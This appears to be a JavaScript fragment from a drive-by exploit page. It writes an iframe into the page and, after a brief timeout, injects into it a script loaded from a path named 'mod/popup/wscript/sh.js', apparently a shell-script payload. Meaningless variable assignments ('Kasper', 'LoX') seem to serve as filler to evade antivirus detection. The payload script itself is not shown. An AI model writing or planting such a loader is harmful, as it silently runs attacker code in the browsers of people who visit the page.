function gSH() {
mf.document.write("<SCRIPT SRC='mod/popup/wscript/sh.js'><\/SCRIPT>");
Kasper = 6;
LoX = Kasper + 2 - 26;
}
document.write("<IFRAME ID=mf SRC='about:blank' WIDTH=200 HEIGHT=200></IFRAME>");
setTimeout("gSH()",100);